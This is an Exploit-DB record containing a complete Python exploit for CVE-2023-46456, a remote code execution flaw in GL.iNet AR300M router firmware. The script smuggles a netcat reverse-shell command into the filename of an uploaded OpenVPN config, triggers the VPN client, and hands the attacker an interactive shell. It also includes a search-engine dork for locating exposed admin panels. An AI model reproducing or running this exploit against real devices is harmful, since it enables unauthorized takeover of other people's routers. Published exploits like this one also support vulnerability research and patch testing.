{"source": "https://www.exploit-db.com/exploits/51854", "vulnName": "GL.iNet AR300M v3.216 Remote Code Execution - CVE-2023-46456 Exploit", "vulnEDBID": "51854", "vulnCVE": "N/A", "author": "CYBERAZ0R", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-03-03", "vulnContent": "#!/usr/bin/env python3\n\n# Exploit Title: GL.iNet <= 3.216 Remote Code Execution via OpenVPN Client\n# Google Dork: intitle:\"GL.iNet Admin Panel\"\n# Date: XX/11/2023\n# Exploit Author: Michele 'cyberaz0r' Di Bonaventura\n# Vendor Homepage: https://www.gli-net.com\n# Software Link: https://fw.gl-inet.com/firmware/ar300m/nand/v1/openwrt-ar300m-3.216-0321-1679391449.tar\n# Version: 3.216\n# Tested on: GL.iNet AR300M\n# CVE: CVE-2023-46456\n\nimport socket\nimport requests\nimport readline\nfrom time import sleep\nfrom random import randint\nfrom sys import stdout, argv\nfrom threading import Thread\n\nrequests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)\n\ndef generate_random_string():\n return ''.join([chr(randint(97, 122)) for x in range(6)])\n\ndef add_config_file(url, auth_token, payload):\n data = {'file': ('{}'.format(payload), 'client\\ndev tun\\nproto udp\\nremote 127.0.0.1 1194\\nscript-security 2')}\n try:\n  r = requests.post(url, files=data, headers={'Authorization':auth_token}, verify=False)\n  r.raise_for_status()\n except requests.exceptions.RequestException:\n  print('[X] Error while adding configuration file')\n  return False\n return True\n\ndef verify_config_file(url, auth_token, payload):\n try:\n  r = requests.get(url, headers={'Authorization':auth_token}, verify=False)\n  r.raise_for_status()\n  if not r.json()['passed'] and payload not in r.json()['passed']:\n   return False\n except requests.exceptions.RequestException:\n  print('[X] Error while verifying the upload of configuration file')\n  return False\n return True\n\ndef add_client(url, auth_token):\n postdata = {'description':'RCE_client_{}'.format(generate_random_string())}\n try:\n  r = requests.post(url, data=postdata, headers={'Authorization':auth_token}, verify=False)\n  r.raise_for_status()\n except requests.exceptions.RequestException:\n  print('[X] Error while adding OpenVPN client')\n  return False\n return True\n\ndef get_client_id(url, auth_token, payload):\n try:\n  r = requests.get(url, headers={'Authorization':auth_token}, verify=False)\n  r.raise_for_status()\n  for conn in r.json()['clients']:\n   if conn['defaultserver'] == payload:\n    return conn['id']\n  print('[X] Error: could not find client ID')\n  return False\n except requests.exceptions.RequestException:\n  print('[X] Error while retrieving added OpenVPN client ID')\n return False\n\ndef connect_vpn(url, auth_token, client_id):\n sleep(0.25)\n postdata = {'ovpnclientid':client_id, 'enableovpn':'true', 'force_client':'false'}\n r = requests.post(url, data=postdata, headers={'Authorization':auth_token}, verify=False)\n\ndef cleanup(url, auth_token, client_id):\n try:\n  r = requests.post(url, data={'clientid':client_id}, headers={'Authorization':auth_token}, verify=False)\n  r.raise_for_status()\n except requests.exceptions.RequestException:\n  print('[X] Error while cleaning up OpenVPN client')\n  return False\n return True\n\ndef get_command_response(s):\n res = ''\n while True:\n  try:\n   resp = s.recv(1).decode('utf-8')\n   res += resp\n  except UnicodeDecodeError:\n   pass\n  except socket.timeout:\n   break\n return res\n\ndef revshell_listen(revshell_ip, revshell_port):\n s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n s.settimeout(5)\n\n try:\n  s.bind((revshell_ip, int(revshell_port)))\n  s.listen(1)\n except Exception as e:\n  print('[X] Exception \"{}\" encountered while binding reverse shell'.format(type(e).__name__))\n  exit(1)\n\n try:\n  clsock, claddr = s.accept()\n  clsock.settimeout(2)\n  if clsock:\n   print('[+] Incoming reverse shell connection from {}:{}, enjoy ;)'.format(claddr[0], claddr[1]))\n   res = ''\n   while True:\n    command = input('$ ')\n    clsock.sendall('{}\\n'.format(command).encode('utf-8'))\n    stdout.write(get_command_response(clsock))\n\n except socket.timeout:\n  print('[-] No connection received in 5 seconds, probably server is not vulnerable...')\n  s.close()\n\n except KeyboardInterrupt:\n  print('\\n[*] Closing connection')\n  try:\n   clsock.close()\n  except socket.error:\n   pass\n  except NameError:\n   pass\n  s.close()\n\ndef main(base_url, auth_token, revshell_ip, revshell_port):\n print('[+] Started GL.iNet <= 3.216 OpenVPN client config filename RCE exploit')\n\n payload = '$(busybox nc {} {} -e sh).ovpn'.format(revshell_ip, revshell_port)\n print('[+] Filename payload: \"{}\"'.format(payload))\n\n print('[*] Uploading crafted OpenVPN config file')\n if not add_config_file(base_url+'/api/ovpn/client/upload', auth_token, payload):\n  exit(1)\n\n if not verify_config_file(base_url+'/cgi-bin/api/ovpn/client/uploadcheck', auth_token, payload):\n  exit(1)\n print('[+] File uploaded successfully')\n\n print('[*] Adding OpenVPN client')\n if not add_client(base_url+'/cgi-bin/api/ovpn/client/addnew', auth_token):\n  exit(1)\n\n client_id = get_client_id(base_url+'/cgi-bin/api/ovpn/client/list', auth_token, payload)\n if not client_id:\n  exit(1)\n print('[+] Client ID: ' + client_id)\n\n print('[*] Triggering connection to created OpenVPN client')\n Thread(target=connect_vpn, args=(base_url+'/cgi-bin/api/ovpn/client/set', auth_token, client_id)).start()\n\n print('[*] Starting reverse shell on {}:{}'.format(revshell_ip, revshell_port))\n revshell_listen(revshell_ip, revshell_port)\n\n print('[*] Clean-up by removing OpenVPN connection')\n if not cleanup(base_url+'/cgi-bin/api/ovpn/client/remove', auth_token, client_id):\n  exit(1)\n\n print('[+] Done')\n\nif __name__ == '__main__':\n if len(argv) < 5:\n  print('Usage: {} <TARGET_URL> <AUTH_TOKEN> <REVSHELL_IP> <REVSHELL_PORT>'.format(argv[0]))\n  exit(1)\n\n main(argv[1], argv[2], argv[3], argv[4])\n            "}